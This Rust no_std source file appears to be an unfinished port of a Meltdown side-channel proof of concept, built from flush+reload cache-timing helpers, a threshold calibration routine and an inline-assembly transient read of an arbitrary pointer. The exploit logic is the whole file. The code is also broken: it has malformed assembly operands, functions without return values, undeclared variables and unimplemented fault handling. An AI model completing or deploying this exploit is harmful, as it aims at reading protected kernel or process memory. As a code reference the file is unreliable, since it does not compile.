#![no_std]

extern crate alloc;

#[allow(unused_imports)]
use runtime::*;
use terminal::{print, println};

use core::arch::asm;

pub fn meltdown_fast(pointer: *const u128) {
    unsafe {
        asm!(
            "mov {tmp} [{x}]",
            "shl 12, {tmp}",
            "mov {tmp2} [{base}+{tmp}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn rdtsc() -> u64 {
    let high: u32;
    let low: u32;
    unsafe {
        asm!(
            "rdtsc",
            out("eax") low,
            out("edx") high
        );
    }
    ((high as u64) << 32) | (low as u64)
}

pub fn maccess(pointer: *const u128) {
    unsafe {
        asm!(
            "mov {tmp}, [{x}]",
            x = in(reg) pointer,
            tmp = out(reg) _,
        );
    }
}

pub fn flush(pointer: *const u128) {
    unsafe {
        asm!(
            "clflush [{x}]",
            x = in(reg) pointer,
        );
    }
}

pub fn flush_reload(pointer: *const u128, cache_miss_threshold: u64) -> bool {
    let start_time: u64;
    let end_time: u64;
    
    start_time = rdtsc();
    maccess(pointer);
    end_time = rdtsc();
    
    flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
    
    end_time - start_time < cache_miss_threshold
}

pub fn libkdump_read_signal_handler(retries: u32, mem: [u128], pointer: *const u128) -> u32 {
	for _ in 0..retries {
		// TODO: Set segmentation fault callback position
		meltdown_fast(pointer);
	}
	
}

pub fn libkdump_read(measurements: u32, retries: u32, mem: [u128], accept_after: u32, pointer: *const u128) -> u32 {
	const ARRAY_SIZE: usize = 256;
	let res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
	
	for _ in 0..measurements {
		// TODO: Add implementation using TSX?
		r = libkdump_read_signal_handler(retries, mem, pointer);
		res_stat[r] += 1;
	}
	
	let max_i = res_stat.iter().max();
	if max_i > accept_after {
		max_i
	} else {
		0
	}
}

pub fn detect_flush_reload_threshold() -> u64{
    let mut reload_time: u64 = 0;
    let mut flush_reload_time: u64 = 0;
    let count: u64 = 10000000;
    let dummy: u128 = 0; // TODO Use single value instead of array ok?
    let pointer: *const u128;
    let mut start_time: u64;
    let mut end_time: u64;
    
    pointer = &dummy;
    
    maccess(pointer);
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        reload_time += end_time - start_time;
    }
    
    for _ in 0..count {
        start_time = rdtsc();
        maccess(pointer);
        end_time = rdtsc();
        flush(pointer);
        flush_reload_time += end_time - start_time;
    }
    
    println!("Total time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    reload_time /= count;
    flush_reload_time /= count;
    println!("Average time: reload: {} flush+reload: {}", reload_time, flush_reload_time);
    let threshold = (flush_reload_time + reload_time * 2) / 3;
    println!("Threshold: {}", threshold);
    return threshold;
}

#[unsafe(no_mangle)]
pub fn main() {
    println!("Meltdown start\n");
    const ARRAY_SIZE: usize = 256 * 256; // 256 entries, each containing 256 u128's, meaning 256*4K
    const SECRET: &str = "Whoever reads this is dumb.";
    
    println!("Current CPU time: {}", rdtsc());
    let cache_miss_threshold = detect_flush_reload_threshold();
    
    let mem: [u128; ARRAY_SIZE] = [0; ARRAY_SIZE];
    
    for i in 0..ARRAY_SIZE {
        flush(&mem[i] as *const u128);
    }
}
